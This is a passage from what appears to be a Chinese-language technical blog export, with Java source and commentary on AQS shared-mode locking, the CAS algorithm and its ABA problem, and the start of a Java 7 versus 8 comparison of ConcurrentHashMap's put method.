<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Releases in exclusive mode.  Implemented by unblocking one or</span></span><br><span class="line"><span class="comment">     * more threads if &#123;<span class="doctag">@link</span> #tryRelease&#125; returns true.</span></span><br><span class="line"><span class="comment">     * This method can be used to implement method &#123;<span class="doctag">@link</span> Lock#unlock&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the release argument.  This value is conveyed to</span></span><br><span class="line"><span class="comment">     *        &#123;<span class="doctag">@link</span> #tryRelease&#125; but is otherwise uninterpreted and</span></span><br><span class="line"><span class="comment">     *        can represent anything you like.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value returned from &#123;<span class="doctag">@link</span> #tryRelease&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">release</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tryRelease(arg)) &#123;</span><br><span class="line">            Node h = head;</span><br><span class="line">            <span class="keyword">if</span> (h != <span class="keyword">null</span> &amp;&amp; h.waitStatus != <span class="number">0</span>)</span><br><span class="line">                unparkSuccessor(h);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用实现类的tryRelease方法，如果成功了，就唤醒继任节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Wakes up node's successor, if one exists.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unparkSuccessor</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If status is negative (i.e., possibly needing signal) try</span></span><br><span class="line"><span class="comment">         * to clear in anticipation of signalling.  It is OK if this</span></span><br><span class="line"><span class="comment">         * fails or if status is changed by waiting thread.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">int</span> ws = node.waitStatus;</span><br><span class="line">        <span class="keyword">if</span> (ws &lt; <span class="number">0</span>)</span><br><span class="line">            compareAndSetWaitStatus(node, ws, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Thread to unpark is held in successor, which is normally</span></span><br><span class="line"><span class="comment">         * just the next node.  But if cancelled or apparently null,</span></span><br><span class="line"><span class="comment">         * traverse backwards from tail to find the actual</span></span><br><span class="line"><span class="comment">         * non-cancelled successor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Node s = node.next;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.waitStatus &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            s = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Node t = tail; t != <span class="keyword">null</span> &amp;&amp; t != node; t = t.prev)</span><br><span class="line">                <span class="keyword">if</span> (t.waitStatus &lt;= <span class="number">0</span>)</span><br><span class="line">                    s = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (s != <span class="keyword">null</span>)</span><br><span class="line">            LockSupport.unpark(s.thread);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果继任节点为空或者状态为CANCEL，则从尾部往前遍历找到一个处于正常阻塞状态的节点，进行唤醒。</p>
<h3 id="共享式"><a href="#共享式" class="headerlink" title="共享式"></a>共享式</h3><p>共享式：共享式地获取同步状态。对于独占式同步组件来讲，同一时刻只有一个线程能获取到同步状态，其他线程都得去排队等待，其待重写的尝试获取同步状态的方法tryAcquire返回值为boolean，这很容易理解；对于共享式同步组件来讲，同一时刻可以有多个线程同时获取到同步状态，这也是“共享”的意义所在。其待重写的尝试获取同步状态的方法tryAcquireShared返回值为int。</p>
<h4 id="获取锁-1"><a href="#获取锁-1" class="headerlink" title="获取锁"></a>获取锁</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempts to acquire in shared mode. This method should query if</span></span><br><span class="line"><span class="comment">     * the state of the object permits it to be acquired in the shared</span></span><br><span class="line"><span class="comment">     * mode, and if so to acquire it.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;This method is always invoked by the thread performing</span></span><br><span class="line"><span class="comment">     * acquire.  If this method reports failure, the acquire method</span></span><br><span class="line"><span class="comment">     * may queue the thread, if it is not already queued, until it is</span></span><br><span class="line"><span class="comment">     * signalled by a release from some other thread.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;The default implementation throws &#123;<span class="doctag">@link</span></span></span><br><span class="line"><span class="comment">     * UnsupportedOperationException&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument. This value is always the one</span></span><br><span class="line"><span class="comment">     *        passed to an acquire method, or is the value saved on entry</span></span><br><span class="line"><span class="comment">     *        to a condition wait.  The value is otherwise uninterpreted</span></span><br><span class="line"><span class="comment">     *        and can represent anything you like.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a negative value on failure; zero if acquisition in shared</span></span><br><span class="line"><span class="comment">     *         mode succeeded but no subsequent shared-mode acquire can</span></span><br><span class="line"><span class="comment">     *         succeed; and a positive value if acquisition in shared</span></span><br><span class="line"><span class="comment">     *         mode succeeded and subsequent shared-mode acquires might</span></span><br><span class="line"><span class="comment">     *         also succeed, in which case a subsequent waiting thread</span></span><br><span class="line"><span class="comment">     *         must check availability. (Support for three different</span></span><br><span class="line"><span class="comment">     *         return values enables this method to be used in contexts</span></span><br><span class="line"><span class="comment">     *         where acquires only sometimes act exclusively.)  Upon</span></span><br><span class="line"><span class="comment">     *         success, this object has been acquired.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalMonitorStateException if acquiring would place this</span></span><br><span class="line"><span class="comment">     *         synchronizer in an illegal state. This exception must be</span></span><br><span class="line"><span class="comment">     *         thrown in a consistent fashion for synchronization to work</span></span><br><span class="line"><span class="comment">     *         correctly.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> UnsupportedOperationException if shared mode is not supported</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">tryAcquireShared</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.当返回值大于0时，表示获取同步状态成功，同时还有剩余同步状态可供其他线程获取；</strong></p>
<p><strong>2.当返回值等于0时，表示获取同步状态成功，但没有可用同步状态了；</strong></p>
<p><strong>3.当返回值小于0时，表示获取同步状态失败。</strong></p>
<p>如果获取同步状态失败，则调用doAcquireShared方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Acquires in shared uninterruptible mode.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the acquire argument</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doAcquireShared</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Node node = addWaiter(Node.SHARED);<span class="comment">//构造一个共享结点，添加到同步队列尾部。若队列初始为空，先添加一个无意义的傀儡结点，再将新节点添加到队列尾部。</span></span><br><span class="line">        <span class="keyword">boolean</span> failed = <span class="keyword">true</span>;<span class="comment">//是否获取成功</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">boolean</span> interrupted = <span class="keyword">false</span>;<span class="comment">//线程parking过程中是否被中断过</span></span><br><span class="line">            <span class="keyword">for</span> (;;) &#123;<span class="comment">//死循环</span></span><br><span class="line">                <span class="keyword">final</span> Node p = node.predecessor();<span class="comment">//找到前驱结点</span></span><br><span class="line">                <span class="keyword">if</span> (p == head) &#123;<span class="comment">//头结点持有同步状态，只有前驱是头结点，才有机会尝试获取同步状态</span></span><br><span class="line">                    <span class="keyword">int</span> r = tryAcquireShared(arg);<span class="comment">//尝试获取同步装填</span></span><br><span class="line">                    <span class="keyword">if</span> (r &gt;= <span class="number">0</span>) &#123;<span class="comment">//r&gt;=0,获取成功</span></span><br><span class="line">                        setHeadAndPropagate(node, r);<span class="comment">//获取成功就将当前结点设置为头结点，若还有可用资源，传播下去，也就是继续唤醒后继结点</span></span><br><span class="line">                        p.next = <span class="keyword">null</span>; <span class="comment">// 方便GC</span></span><br><span class="line">                        <span class="keyword">if</span> (interrupted)</span><br><span class="line">                            selfInterrupt();</span><br><span class="line">                        failed = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;<span class="comment">//是否能安心进入parking状态</span></span><br><span class="line">                    parkAndCheckInterrupt())<span class="comment">//阻塞线程</span></span><br><span class="line">                    interrupted = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (failed)</span><br><span class="line">                cancelAcquire(node);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大体逻辑与独占式的acquireQueued差距不大，只不过由于是共享式，会有多个线程同时获取到线程，也可能同时释放线程，空出很多同步状态，所以当排队中的老二获取到同步状态，如果还有可用资源，会继续传播下去。</p>
<p><strong>setHeadAndPropagate</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Sets head of queue, and checks if successor may be waiting</span></span><br><span class="line"><span class="comment">     * in shared mode, if so propagating if either propagate &gt; 0 or</span></span><br><span class="line"><span class="comment">     * PROPAGATE status was set.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> node the node</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> propagate the return value from a tryAcquireShared</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setHeadAndPropagate</span><span class="params">(Node node, <span class="keyword">int</span> propagate)</span> </span>&#123;</span><br><span class="line">        Node h = head; <span class="comment">// Record old head for check below</span></span><br><span class="line">        setHead(node);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Try to signal next queued node if:</span></span><br><span class="line"><span class="comment">         *   Propagation was indicated by caller,</span></span><br><span class="line"><span class="comment">         *     or was recorded (as h.waitStatus either before</span></span><br><span class="line"><span class="comment">         *     or after setHead) by a previous operation</span></span><br><span class="line"><span class="comment">         *     (note: this uses sign-check of waitStatus because</span></span><br><span class="line"><span class="comment">         *      PROPAGATE status may transition to SIGNAL.)</span></span><br><span class="line"><span class="comment">         * and</span></span><br><span class="line"><span class="comment">         *   The next node is waiting in shared mode,</span></span><br><span class="line"><span class="comment">         *     or we don't know, because it appears null</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * The conservatism in both of these checks may cause</span></span><br><span class="line"><span class="comment">         * unnecessary wake-ups, but only when there are multiple</span></span><br><span class="line"><span class="comment">         * racing acquires/releases, so most need signals now or soon</span></span><br><span class="line"><span class="comment">         * anyway.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (propagate &gt; <span class="number">0</span> || h == <span class="keyword">null</span> || h.waitStatus &lt; <span class="number">0</span> ||</span><br><span class="line">            (h = head) == <span class="keyword">null</span> || h.waitStatus &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            Node s = node.next;</span><br><span class="line">            <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.isShared())</span><br><span class="line">                doReleaseShared();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="释放锁-1"><a href="#释放锁-1" class="headerlink" title="释放锁"></a>释放锁</h4><p><strong>releaseShared</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Releases in shared mode.  Implemented by unblocking one or more</span></span><br><span class="line"><span class="comment">     * threads if &#123;<span class="doctag">@link</span> #tryReleaseShared&#125; returns true.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> arg the release argument.  This value is conveyed to</span></span><br><span class="line"><span class="comment">     *        &#123;<span class="doctag">@link</span> #tryReleaseShared&#125; but is otherwise uninterpreted</span></span><br><span class="line"><span class="comment">     *        and can represent anything you like.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value returned from &#123;<span class="doctag">@link</span> #tryReleaseShared&#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">releaseShared</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tryReleaseShared(arg)) &#123;</span><br><span class="line">            doReleaseShared();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Release action for shared mode -- signals successor and ensures</span></span><br><span class="line"><span class="comment">    * propagation. (Note: For exclusive mode, release just amounts</span></span><br><span class="line"><span class="comment">    * to calling unparkSuccessor of head if it needs signal.)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doReleaseShared</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Ensure that a release propagates, even if there are other</span></span><br><span class="line"><span class="comment">        * in-progress acquires/releases.  This proceeds in the usual</span></span><br><span class="line"><span class="comment">        * way of trying to unparkSuccessor of head if it needs</span></span><br><span class="line"><span class="comment">        * signal. But if it does not, status is set to PROPAGATE to</span></span><br><span class="line"><span class="comment">        * ensure that upon release, propagation continues.</span></span><br><span class="line"><span class="comment">        * Additionally, we must loop in case a new node is added</span></span><br><span class="line"><span class="comment">        * while we are doing this. Also, unlike other uses of</span></span><br><span class="line"><span class="comment">        * unparkSuccessor, we need to know if CAS to reset status</span></span><br><span class="line"><span class="comment">        * fails, if so rechecking.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">           Node h = head;</span><br><span class="line">           <span class="keyword">if</span> (h != <span class="keyword">null</span> &amp;&amp; h != tail) &#123;</span><br><span class="line">               <span class="keyword">int</span> ws = h.waitStatus;</span><br><span class="line">               <span class="keyword">if</span> (ws == Node.SIGNAL) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!compareAndSetWaitStatus(h, Node.SIGNAL, <span class="number">0</span>))</span><br><span class="line">                       <span class="keyword">continue</span>;            <span class="comment">// loop to recheck cases</span></span><br><span class="line">                   unparkSuccessor(h);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> (ws == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                        !compareAndSetWaitStatus(h, <span class="number">0</span>, Node.PROPAGATE))</span><br><span class="line">                   <span class="keyword">continue</span>;                <span class="comment">// loop on failed CAS</span></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (h == head)                   <span class="comment">// loop if head changed</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AQS是JUC中很多同步组件的构建基础，简单来讲，它内部实现主要是状态变量state和一个FIFO队列来完成，同步队列的头结点是当前获取到同步状态的结点，获取同步状态state失败的线程，会被构造成一个结点（或共享式或独占式）加入到同步队列尾部（采用自旋CAS来保证此操作的线程安全），随后线程会阻塞；释放时唤醒头结点的后继结点，使其加入对同步状态的争夺中。</p>
<p>AQS为我们定义好了顶层的处理实现逻辑，我们在使用AQS构建符合我们需求的同步组件时，只需重写tryAcquire，tryAcquireShared，tryRelease，tryReleaseShared几个方法，来决定同步状态的释放和获取即可，至于背后复杂的线程排队，线程阻塞/唤醒，如何保证线程安全，都由AQS为我们完成了，这也是非常典型的模板方法的应用。AQS定义好顶级逻辑的骨架，并提取出公用的线程入队列/出队列，阻塞/唤醒等一系列复杂逻辑的实现，将部分简单的可由使用者决定的操作逻辑延迟到子类中去实现。　</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/J080624/article/details/84849315?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">队列同步器AQS-AbstractQueuedSynchronizer 原理分析</a></p>
<p><a href="https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/chengxiao/p/7141160.html" target="_blank" rel="noopener">Java并发包基石-AQS详解</a></a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
        <tag>AQS</tag>
        <tag>AbstractQueuedSynchronizer</tag>
      </tags>
  </entry>
  <entry>
    <title>CAS算法解析</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-05-Java-CAS-%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="CAS算法"><a href="#CAS算法" class="headerlink" title="CAS算法"></a>CAS算法</h1><p>CAS（比较与交换，Compare and swap） 是一种有名的无锁算法。无锁编程，即不使用锁的情况下实现多线程之间的变量同步，也就是在没有线程被阻塞的情况下实现变量的同步，所以也叫非阻塞同步（Non-blocking Synchronization）。实现非阻塞同步的方案称为“无锁编程算法”（ Non-blocking algorithm）。<br>CAS, CPU指令，在大多数处理器架构，包括IA32、Space中采用的都是CAS指令，CAS的语义是“我认为V的值应该为A，如果是，那么将V的值更新为B，否则不修改并告诉V的值实际为多少”，CAS是项 乐观锁 技术，当多个线程尝试使用CAS同时更新同一个变量时，只有其中一个线程能更新变量的值，而其它线程都失败，失败的线程并不会被挂起，而是被告知这次竞争中失败，并可以再次尝试。CAS有3个操作数，内存值V，旧的预期值A，要修改的新值B。当且仅当预期值A和内存值V相同时，将内存值V修改为B，否则什么都不做。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>java.util.concurrent.atomic中的AtomicXXX，都使用了这些底层的JVM支持为数字类型的引用类型提供一种高效的CAS操作，而在java.util.concurrent中的大多数类在实现时都直接或间接的使用了这些原子变量类，这些原子变量都调用了 sun.misc.Unsafe 类库里面的 CAS算法，用CPU指令来实现无锁自增</p>
<p>下面就以AtomicInteger类为例，看看它是如何使用CAS算法来提升效率的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Atomically increments by one the current value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the previous value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndIncrement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unsafe.getAndAddInt(<span class="keyword">this</span>, valueOffset, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Atomically decrements by one the current value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the previous value</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndDecrement</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unsafe.getAndAddInt(<span class="keyword">this</span>, valueOffset, -<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>摘取了两个AtomicInter类中自增1和自减1的方法来做说明，它们都是调用了UnSave封装的CAS操作来实现的。</p>
<p>UnSave类相关信息可参见文章<a href>UnSave类解析</a></p>
<h2 id="CAS算法存在的问题"><a href="#CAS算法存在的问题" class="headerlink" title="CAS算法存在的问题"></a>CAS算法存在的问题</h2><p>CAS算法存在一个ABA问题。</p>
<p>假设有如下操作：</p>
<ol>
<li>假设有两个线程T1，T2正在操作一个字符C，此时C的值为A。</li>
<li>在某一时刻，T1和T2都要修改C的值，于是，它们将C当前值A拷贝一份过去。</li>
<li>由于线程调度，T2将C的值修改为B，</li>
<li>由于线程调度，T2又将C的值修改回A。</li>
<li>T1准备修改C的值。它把C的当前值和自己保存的值进行比较，发现一致，认为C的值从它取值之后就没有发生过变更</li>
<li>T1修改C的值为D，结束。</li>
</ol>
<p>对T1来说，C的值就从来没有变过，但实际上C的值已经变化了两次，只是变回了原值而已。</p>
<p>在Java 1.5开始，atomic包中引入了一个类AtomicStampedReference来解决ABA问题。这个类中的compareAndSet方法不仅会检查当前引用是否等于预期引用，还会检查当前的stamp（版本号、时间戳）是否和预期的相等。只要有一个不一致，就认为值已经发生过变更。CAS操作就做失败处理。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>锁</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title>ConcurrentHashMap在Java1.7和1.8中的区别</title>
    <url>/2020/03/12/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-12-%E5%A4%9A%E7%BA%BF%E7%A8%8B-07-ConcurrentHashMap%E5%9C%A8Java1.7%E5%92%8C1.8%E4%B8%AD%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="ConcurrentHashMap在Java-7和Java-8中的区别"><a href="#ConcurrentHashMap在Java-7和Java-8中的区别" class="headerlink" title="ConcurrentHashMap在Java 7和Java 8中的区别"></a>ConcurrentHashMap在Java 7和Java 8中的区别</h1><p>ConcurrentHashMap在Java中一直是一个多线程的大杀器。在多线程环境下，使用它就可以免去使用HashMap造成的线程不安全的问题。鉴于Java 8已经出来N久了，在各个方面和Java 7都有所不同。下面我们就从源码级别对ConcurrentHashMap进行分析，看看从Java 7 到Java 8，它到底有哪些变化？</p>
<h2 id="Java-7中的ConcurrentHashMap"><a href="#Java-7中的ConcurrentHashMap" class="headerlink" title="Java 7中的ConcurrentHashMap"></a>Java 7中的ConcurrentHashMap</h2><h3 id="put方法实现"><a href="#put方法实现" class="headerlink" title="put方法实现"></a>put方法实现</h3><p>在Java 7 中，put一个值到ConcurrentHashMap主要有以下这些步骤：</p>
<ol>
<li>首先计算出这个key对应的segment，<code>(hash &gt;&gt;&gt; segmentShift) &amp; segmentMask;</code></li>
<li>通过key再次计算出，这个值在table数组中的位置</li>
<li>首先尝试获取锁，成功获取锁之后，转到4，否则，转到8</li>
<li>获取table数组的头结点，遍历；</li>
<li>如果当前key在链表中，则直接覆盖其值，不在的话，转为6</li>
<li>将节点插入头结点位置，作为第一个节点；</li>
<li>判断是否需要扩容，如有，扩容</li>
<li>遍历是否存在相同的key</li>
<li>在步骤8遍历时，自旋获取锁，如果超过最大限制64次，则阻塞。</li>
</ol>
<h4 id="put方法"><a href="#put方法" class="headerlink" title="put方法"></a>put方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">put</span><span class="params">(K key, <span class="keyword">int</span> hash, V value, <span class="keyword">boolean</span> onlyIfAbsent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//Segment继承ReentrantLock，尝试获取独占锁</span></span><br><span class="line">        HashEntry&lt;K,V&gt; node = tryLock() ? <span class="keyword">null</span> :</span><br><span class="line">                scanAndLockForPut(key, hash, value);</span><br><span class="line">        V oldValue;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt;[] tab = table;</span><br><span class="line">            <span class="comment">//定位键值对在HashEntry数组上的位置</span></span><br><span class="line">            <span class="keyword">int</span> index = (tab.length - <span class="number">1</span>) &amp; hash;</span><br><span class="line">            <span class="comment">//获取这个位置的第一个键值对</span></span><br><span class="line">            HashEntry&lt;K,V&gt; first = entryAt(tab, index);</span><br><span class="line">            <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = first;;) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;<span class="comment">//此处有链表结构，一直循环到e==null</span></span><br><span class="line">                    K k;</span><br><span class="line">                    <span class="comment">//存在与待插入键值对相同的键，则替换value</span></span><br><span class="line">                    <span class="keyword">if</span> ((k = e.key) == key ||</span><br><span class="line">                            (e.hash == hash &amp;&amp; key.equals(k))) &#123;</span><br><span class="line">                        oldValue = e.value;</span><br><span class="line">                        <span class="keyword">if</span> (!onlyIfAbsent) &#123;<span class="comment">//onlyIfAbsent默认为false</span></span><br><span class="line">                            e.value = value;</span><br><span class="line">                            ++modCount;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    e = e.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//node不为null,设置node的next为first，node为当前链表的头节点</span></span><br><span class="line">                    <span class="keyword">if</span> (node != <span class="keyword">null</span>)</span><br><span class="line">                        node.setNext(first);</span><br><span class="line">                    <span class="comment">//node为null,创建头节点,指定next为first，node为当前链表的头节点</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        node = <span class="keyword">new</span> HashEntry&lt;K,V&gt;(hash, key, value, first);</span><br><span class="line">                    <span class="keyword">int</span> c = count + <span class="number">1</span>;</span><br><span class="line">                    <span class="comment">//扩容条件 (1)entry数量大于阈值 (2) 当前数组tab长度小于最大容量。满足以上条件就扩容</span></span><br><span class="line">                    <span class="keyword">if</span> (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)</span><br><span class="line">                        <span class="comment">//扩容</span></span><br><span class="line">                        rehash(node);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        <span class="comment">//tab的index位置设置为node,</span></span><br><span class="line">                        setEntryAt(tab, index, node);</span><br><span class="line">                    ++modCount;</span><br><span class="line">                    count = c;</span><br><span class="line">                    oldValue = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            unlock();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="scanAndLockForPut"><a href="#scanAndLockForPut" class="headerlink" title="scanAndLockForPut"></a>scanAndLockForPut</h4><p>在不超过最大重试次数MAX_SCAN_RETRIES通过CAS尝试获取锁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> HashEntry&lt;K,V&gt; <span class="title">scanAndLockForPut</span><span class="params">(K key, <span class="keyword">int</span> hash, V value)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//first,e:键值对的hash值定位到数组tab的第一个键值对</span></span><br><span class="line">        HashEntry&lt;K,V&gt; first = entryForHash(<span class="keyword">this</span>, hash);</span><br><span class="line">        HashEntry&lt;K,V&gt; e = first;</span><br><span class="line">        HashEntry&lt;K,V&gt; node = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> retries = -<span class="number">1</span>; <span class="comment">// negative while locating node</span></span><br><span class="line">        <span class="comment">//线程尝试通过CAS获取锁</span></span><br><span class="line">        <span class="keyword">while</span> (!tryLock()) &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt; f; <span class="comment">// to recheck first below</span></span><br><span class="line">            <span class="keyword">if</span> (retries &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//当e==null或key.equals(e.key)时retry=0，走出这个分支</span></span><br><span class="line">                <span class="keyword">if</span> (e == <span 